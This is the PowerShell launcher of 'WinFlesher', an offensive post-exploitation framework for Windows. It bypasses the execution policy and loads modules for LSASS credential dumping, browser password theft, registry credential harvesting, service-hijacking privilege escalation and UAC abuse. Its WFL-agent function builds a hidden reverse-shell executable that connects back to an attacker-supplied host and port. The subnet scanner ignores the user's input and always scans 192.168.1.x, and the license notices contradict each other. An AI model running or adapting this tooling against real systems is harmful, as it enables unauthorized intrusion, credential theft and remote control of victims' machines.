<#
.SYNOPSIS
    WINFLESHER v0.1.0.5 
    MITRE EXPLOITATION FRAMEWORK  
    Written by: Alessandro 'mindsflee' Salzano 
    https://github.com/mindsflee                
                                                                                                                                      
    It is released under  GNU GENERAL PUBLIC LICENSE
    that can be downloaded here:                                    
    https://github.com/mindsflee/WinFlesher/blob/main/LICENSE
 
.DESCRIPTION
    Invoke-WinFlesher is a post exploitation framework for windows written in powershell. 
    It was created by adapting the exploitation techniques to MITRE and it was meant to be modular.
.EXAMPLE
    PS C:\> . .\Invoke-WinFlesher.ps1
    PS C:\> WFL-check-T1574.009

     [+] WARNING: this system is most likely vulnerable to Path Interception by Unquoted Path!


    ProcessId   : 0
    Name        : Vulnerable Service
    DisplayName : Vuln Service
    PathName    : C:\Program Files\A Subfolder\B Subfolder\C Subfolder\Executable.exe
    StartName   : LocalSystem
    StartMode   : Auto
    State       : Stopped
#>



Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
#$Host.UI.RawUI.BackgroundColor = 'Black'




Import-Module ./lib/exec.ps1 -Scope Local
Import-Module ./mod/T1574.010.ps1 -Scope Local
Import-Module ./mod/T1574.009.ps1 -Scope Local
Import-Module ./mod/T1552.002.ps1 -Scope Local
Import-Module ./mod/T1555.003.ps1 -Scope Local
Import-Module ./mod/T1003.001.ps1 -Scope Local
Import-Module ./mod/T1574.011.ps1 -Scope Local
Import-Module ./mod/T1548.004.ps1 -Scope Local




function Menu {
    $Host.UI.RawUI.ForegroundColor = 'Red'
    Write-Output @"

 ██╗    ██╗██╗███╗   ██╗███████╗██╗     ███████╗███████╗██╗  ██╗███████╗██████╗ 
 ██║    ██║██║████╗  ██║██╔════╝██║     ██╔════╝██╔════╝██║  ██║██╔════╝██╔══██╗
 ██║ █╗ ██║██║██╔██╗ ██║█████╗  ██║     █████╗  ███████╗███████║█████╗  ██████╔╝
 ██║███╗██║██║██║╚██╗██║██╔══╝  ██║     ██╔══╝  ╚════██║██╔══██║██╔══╝  ██╔══██╗
 ╚███╔███╔╝██║██║ ╚████║██║     ███████╗███████╗███████║██║  ██║███████╗██║  ██║
  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝     ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"@

    $Host.UI.RawUI.ForegroundColor = 'Green' 
    write-host 
    echo @"                                                     
           WINFLESHER v0.1.0.5 
           
           MITRE EXPLOITATION FRAMEWORK  
 
   Written by: Alessandro 'mindsflee' Salzano 
            https://github.com/mindsflee                
                                                                                                                                      
   It is released under Common Development and Distribution License 1.0 
        that can be downloaded here:                                    
        https://opensource.org/licenses/CDDL-1.0                        
                                                                        
"@
    $Host.UI.RawUI.ForegroundColor = 'White'

}
function  WFL-help { 
    Write-Host
    Write-Host "================================= Winflesher =================================="
    Write-Host
    Write-Host " WFL-help               Displays the help menu"
    Write-Host " WFL-list               List all modules"
    Write-Host " WFL-info-    (module)  Get information about a module (EX:WFL-info-T1574.010)"
    Write-Host " WFL-check-   (module)  Check if an host is vulnerable (EX:WFL-check-T1574.010)"
    Write-Host " WFL-exploit- (module)  Exploit a vulnerability (EX:WFL-exploit-T1574)"
    Write-Host " WFL-agent              Create and configure a Winflesher Agent"
    Write-Host " WFL-scan               Scan a subnet network"
    Write-Host " WFL-banner             Show Winflesher Banner"
    Write-Host " WFL-clear              Removes all text from the current display"
    Write-Host " WFL-restart            Start a new session of Winflesher"
    Write-Host " WFL-exit               Exit Winflesher"
    Write-Host
    write-host

} 
menu
WFL-help
function Show-Menu {
    param (
        [string]$Title = 'WINFLESHER'
    )
    #Clear-Host

}

function WFL-banner {
    Menu

}

Show-Menu –Title 'winflesher'
write-host

   
    
function WFL-agent { 
	
    Write-Host
    $ipaddress_rev = Read-Host -Prompt '[*] Insert LHOST: '
    $port_rev = Read-Host -Prompt '[*] Insert LPORT: '
	 
    $original_file = './lib/rev.ps1'
    $destination_file = './lib/revshell.ps1'
            (Get-Content $original_file) | Foreach-Object {
        $_ -replace 'ipaddress_rev', $ipaddress_rev `
            -replace 'port_rev', $port_rev `
    } | Set-Content $destination_file
	  
    Invoke-Exec ./lib/revshell.ps1 ./lib/revshell.exe -noConsole -noError
    Remove-Item ./lib/revshell.ps1
    write-host
    #Read-Host " [*] Press any key to continue..."
        
   
       
} function WFL-exploit {
    write-host
    write-host "  Please choose a module name (Ex: WFL-exploit-T1574.010)" -ForegroundColor Red
    write-host
    #Read-Host " [*] Press any key to continue..."

} function WFL-check {
    write-host
    write-host "  Please choose a module name (Ex: WFL-check-T1574.010)" -ForegroundColor Red
    write-host
    #Read-Host " [*] Press any key to continue..."

} function WFL-info {
    write-host
    write-host "  Please choose a module name (Ex: WFL-info-T1574.010)" -ForegroundColor Red
    write-host
    #Read-Host " [*] Press any key to continue..."

} function WFL-exploit- {
    write-host
    write-host "  Please choose a module name (Ex: WFL-exploit-T1574.010)" -ForegroundColor Red
    write-host
    #Read-Host " [*] Press any key to continue..."

} function WFL-check- {
    write-host
    write-host "  Please choose a module name (Ex: WFL-check-T1574.010)" -ForegroundColor Red
    write-host
    #Read-Host " [*] Press any key to continue..."

} function WFL-info- {
    write-host
    write-host "  Please choose a module name (Ex: WFL-info-T1574.010)" -ForegroundColor Red
    write-host
    #Read-Host " [*] Press any key to continue..."
        
} function WFL-list {
    write-host
    Write-Host "================================= Modules List ================================"
    Write-Host
    Write-Host " T1574.009          Hijack Execution Flow: Path Interception by Unquoted Path"
    Write-Host " T1574.010          Hijack Execution Flow: Services File Permissions Weakness"
    Write-Host " T1574.011          Hijack Execution Flow: Services Registry Permissions Weakness"
    Write-Host " T1552.002          Unsecured Credentials: Credentials in Registry"
    Write-Host " T1555.003          Credentials from Password Stores: Credentials from Web Browsers"
    Write-Host " T1003.001          OS Credential Dumping: LSASS Memory"
    Write-Host " T1548.004          Abuse Elevation Control Mechanism: Elevated Execution with Prompt"
    Write-Host
    Write-Host
    # Read-Host " [*] Press any key to continue..."
        
     
        
} function WFL-scan {
    write-host
		
    $network = Read-Host -Prompt '[*] Insert Subnet Network without single IP adresses (Ex: 192.168.0)'
    1..254 | ForEach-Object { Get-WmiObject Win32_PingStatus -Filter "Address='192.168.1.$_' and Timeout=200 and ResolveAddressNames='true' and StatusCode=0" | select ProtocolAddress* }
		
} function WFL-exit {
    exit
}
function WFL-clear {
    Clear-Host
}
function WFL-restart {
    clear-host
    .\Invoke-WinFlesher.ps1
}
    



